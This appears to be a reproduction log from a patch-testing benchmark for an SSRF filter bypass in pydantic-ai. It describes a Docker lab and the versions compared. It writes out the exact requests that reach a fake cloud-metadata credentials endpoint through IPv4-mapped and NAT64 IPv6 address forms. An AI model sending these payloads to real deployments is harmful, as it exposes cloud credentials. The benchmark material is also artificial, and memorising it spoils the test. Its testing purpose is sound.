PatchClosure-Bench repro — pydantic-ai-cve-2026-48782 (CVE-2026-46678 -> CVE-2026-48782)
Rebuild: real-library-wrap (real pip pydantic-ai per version + minimal HTTP wrapper + SSRF sidecar)
Date: 2026-07-16
Host: Docker Engine 29.4.0, Compose v5.1.2, macOS (Darwin 25.5.0)

WHAT CHANGED (HARD POLICY compliance)
  BEFORE (BANNED): harness.py imported pcb_guard/{v0,v1,v2}/_ssrf.py — pydantic-ai's _ssrf.py
                   (safe_download / is_cloud_metadata_ip / _normalize_ip / _embedded_ipv4s) LIFTED
                   VERBATIM into the repo; Dockerfile installed only httpx (no real pydantic-ai).
  AFTER  (COMPLIANT): each version image `pip install`s the REAL published PyPI distribution
                   pydantic-ai-slim==<ver> (pydantic-ai's core distribution; identical real bytes of
                   pydantic_ai/_ssrf.py, models/__init__.py, messages.py). app.py is a thin HTTP
                   wrapper that builds a REAL pydantic_ai.messages.ImageUrl and calls the REAL
                   pydantic_ai.models.download_item(item, data_format='text'), which internally calls
                   the installed pydantic_ai._ssrf.safe_download. The SSRF guard runs entirely from
                   the installed package. No _ssrf.py bytes live in this repo any more (the old
                   pcb_guard/ + harness.py are left in place, unused, and reported as stale).

REAL PACKAGE VERSIONS (verified on PyPI + inspected sdists)
  V0 = pydantic-ai-slim==1.56.0   -> _ssrf.py present; is_cloud_metadata_ip(ip) == (ip in
                                     _CLOUD_METADATA_IPS), a plain STRING frozenset, NO IPv6-transition
                                     normalization (CVE-2026-46678 still OPEN here)
  V1 = pydantic-ai-slim==1.99.0   -> _ssrf.py adds _normalize_ip() unwrapping ipv4_mapped / sixtofour /
                                     NAT64-WELL-KNOWN (64:ff9b::/96) ONLY before the blocklist check
                                     (CVE-2026-46678 fix; CVE-2026-48782 residual open)      <- target
  V2 = pydantic-ai-slim==1.102.0  -> is_cloud_metadata_ip uses _embedded_ipv4s(ip, exhaustive=True),
                                     decoding EVERY standardized IPv4-in-IPv6 embedding incl. NAT64
                                     across all prefix lengths (RFC 8215 /48) (CVE-2026-48782 fix)
  Source-verified wiring (all three wheels): download_item -> `allow_local = item.force_download ==
    'allow-local'` -> safe_download(item.url, allow_local=...). safe_download connects to the resolved
    IP literal via build_url_with_ip, so the IPv6 NAT64 form is dialed directly.
  Wrapper root self-reports the installed version at runtime:
    GET :39670/ -> {"ok":true,"version":"v0","pydantic_ai":"1.56.0"}
    GET :39671/ -> {"ok":true,"version":"v1","pydantic_ai":"1.99.0"}
    GET :39672/ -> {"ok":true,"version":"v2","pydantic_ai":"1.102.0"}

TOPOLOGY
  docker network metanet, dual-stack: 100.100.100.0/24 + 64:ff9b:1::/64 (enable_ipv6=true).
  canary bound to BOTH 100.100.100.200 (IPv4) and 64:ff9b:1::6464:64c8 (NAT64 RFC 8215 local-use
  IPv6 of that IPv4), a single dual-stack (::, IPV6_V6ONLY=0) listener on :80, NO host port, serving
  ${PCB_FLAG} as fake iam/security-credentials. Wrappers on host ports 39670/39671/39672 with
  sysctl net.ipv6.conf.all.disable_ipv6=0 so the container routes the NAT64 IPv6 literal to the canary.

EXTERNAL HTTP TRIGGER + OBSERVED RESULTS  (PCB_FLAG=PCB_3f3d939cbdfae7dfbdbe59f2)
  allow_local=1 (force_download='allow-local', the residual precondition) in all four:

  [ORIGINAL / CVE-2026-46678 seed] IPv4-mapped IPv6 form of the metadata IP
    GET http://127.0.0.1:39670/fetch?url=http://[::ffff:100.100.100.200]/&allow_local=1
      V0 (1.56.0) -> ok:true  body="...iam/security-credentials: PCB_3f3d939cbdfae7dfbdbe59f2"  FLAG
             (string blocklist misses '::ffff:100.100.100.200'; is_private_ip skipped under
              allow_local; real httpx fetch routed over IPv4 to the canary)
    GET http://127.0.0.1:39671/fetch?url=http://[::ffff:100.100.100.200]/&allow_local=1
      V1 (1.99.0) -> ok:false error="ValueError: Access to cloud metadata service
             (::ffff:100.100.100.200) is blocked for security reasons."                     BLOCKED
             (_normalize_ip unwraps the v4-mapped form -> 100.100.100.200)

  [RESIDUAL / CVE-2026-48782 bypass] NAT64 RFC 8215 local-use IPv6 form of the same metadata IP
    GET http://127.0.0.1:39671/fetch?url=http://[64:ff9b:1::6464:64c8]/&allow_local=1
      V1 (1.99.0) -> ok:true  body="...iam/security-credentials: PCB_3f3d939cbdfae7dfbdbe59f2"  FLAG
             (_normalize_ip decodes only the /96 well-known NAT64 prefix, NOT the /48 local-use form;
              str '64:ff9b:1::6464:64c8' not in _CLOUD_METADATA_IPS; is_private_ip skipped under
              allow_local; the dual-stack canary answers on that IPv6 -> SSRF succeeds)         BYPASS
    GET http://127.0.0.1:39672/fetch?url=http://[64:ff9b:1::6464:64c8]/&allow_local=1
      V2 (1.102.0) -> ok:false error="ValueError: Access to cloud metadata service
             (64:ff9b:1::6464:64c8) is blocked for security reasons."                        BLOCKED
             (_embedded_ipv4s(exhaustive=True) decodes NAT64 across all prefix lengths -> 100.100.100.200)

